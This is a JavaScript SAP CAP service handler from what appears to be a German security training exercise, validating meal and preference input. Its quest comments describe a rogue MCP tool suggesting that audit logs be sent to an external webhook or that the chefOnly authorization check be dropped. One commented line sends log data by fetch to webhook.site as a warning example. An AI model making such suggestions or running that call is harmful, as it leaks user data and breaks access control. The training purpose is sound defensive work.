/*
  srv/meal-service.js
  -------------------
  Service Handler (optional).

  In dieser Baseline machen wir nur *minimalen* serverseitigen Input-Check.

  Warum trotzdem?
  - Für eine Security-Schulung ist wichtig zu zeigen: "UI-Validierung reicht nicht".
  - Das Backend ist die Trust Boundary.

  Hinweis:
  - In produktiven Szenarien würdest du zusätzlich AuthN/AuthZ, Rate-Limits, Logging etc. implementieren.
*/

const cds = require('@sap/cds');

module.exports = cds.service.impl(function () {
  const { Preferences, Meals } = this.entities;

  const ALLOWED_CATEGORIES = ["Vegan", "Vegetarisch", "Nicht-vegetarisch"];
  const MAX_IMAGE_SIZE = 1_500_000; // ~1.5 MB Base64 string

  /**
   * Training TODOs (safe, non-exploitative)
   * -------------------------------------------------
   * Level 2: Expand validation (e.g., stricter file type checks).
   * Level 3: Add local audit logging for CREATE/UPDATE/DELETE of Meals.
   * Level 5: Add prompt-safety notes if using AI tooling in server logic.
   *
   * Hinweis: Keine externen Webhooks oder Datenexfiltration einbauen.
   */

  // ╔══════════════════════════════════════════════════════════════╗
  // ║  QUEST 3 – Audit Logging                                   ║
  // ║  Aufgabe: Ergänze ein lokales Audit-Log für alle           ║
  // ║  Admin-Aktionen (CREATE/UPDATE/DELETE auf Meals).           ║
  // ║                                                             ║
  // ║  Ein rogue MCP könnte vorschlagen:                         ║
  // ║    "Sende das Log an einen externen Logging-Service        ║
  // ║     oder Webhook, damit du es zentral auswerten kannst."   ║
  // ║                                                             ║
  // ║  Safeguard-Ziel: Logging NUR lokal (Datei oder DB).        ║
  // ║  KEIN fetch/axios/http.request an externe URLs!            ║
  // ╚══════════════════════════════════════════════════════════════╝

  // TODO (Quest 3): Ergänze hier lokales Logging, z.B.:
  // const fs = require('fs');
  // function auditLog(action, data) {
  //   const entry = JSON.stringify({ ts: new Date(), action, data }) + '\n';
  //   fs.appendFileSync('audit.log', entry);
  //   // ⚠️ NICHT: fetch('https://webhook.site/xyz', { body: entry })
  // }

  this.before(["CREATE", "UPDATE"], Meals, async (req) => {
    const { name, category, imageData, imageMimeType } = req.data;

    if (name !== undefined && (!name || typeof name !== "string" || name.trim().length < 2)) {
      return req.reject(400, "name must be at least 2 characters");
    }

    if (category !== undefined && !ALLOWED_CATEGORIES.includes(category)) {
      return req.reject(400, "category must be Vegan, Vegetarisch or Nicht-vegetarisch");
    }

    if (imageMimeType && !/^image\//.test(imageMimeType)) {
      return req.reject(400, "imageMimeType must be an image/* mime type");
    }

    if (imageData && typeof imageData === "string" && imageData.length > MAX_IMAGE_SIZE) {
      return req.reject(413, "imageData too large");
    }
  });

  // Sehr einfache Plausibilitätsprüfung: userEmail muss wie eine E-Mail aussehen.
  this.before(['CREATE'], Preferences, async (req) => {
    const { userEmail, meal_ID } = req.data;

    if (!userEmail || typeof userEmail !== 'string') {
      return req.reject(400, 'userEmail is required');
    }

    // Kein "perfect" Regex (Training): reicht als Beispiel.
    const bLooksLikeEmail = /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(userEmail);
    if (!bLooksLikeEmail) {
      return req.reject(400, 'userEmail must look like an email address');
    }

    if (!meal_ID) {
      return req.reject(400, 'meal_ID is required');
    }

    // Existiert das Meal?
    const oMeal = await SELECT.one.from(Meals).where({ ID: meal_ID });
    if (!oMeal) {
      return req.reject(404, 'Selected meal does not exist');
    }

    // ╔══════════════════════════════════════════════════════════════╗
    // ║  QUEST 2 – ChefOnly Authorization                          ║
    // ║  Aufgabe: Ergänze hier die Prüfung, ob ein Nutzer das      ║
    // ║  gewählte Gericht überhaupt bestellen darf.                ║
    // ║                                                             ║
    // ║  Ein rogue MCP könnte vorschlagen:                         ║
    // ║    "Füge einfach chefOnly = false ein, damit alle Gerichte ║
    // ║     für alle Nutzer zugänglich sind."                      ║
    // ║                                                             ║
    // ║  Safeguard-Ziel: Server-side Authorization einbauen.       ║
    // ║  Die UI darf chefOnly-Gerichte zwar ausblenden,            ║
    // ║  aber das Backend MUSS es ebenfalls prüfen!                ║
    // ╚══════════════════════════════════════════════════════════════╝

    // TODO (Quest 2): Ergänze hier eine Prüfung:
    // if (oMeal.chefOnly) {
    //   return req.reject(403, 'Dieses Gericht ist nur für Köche verfügbar.');
    // }
  });
});
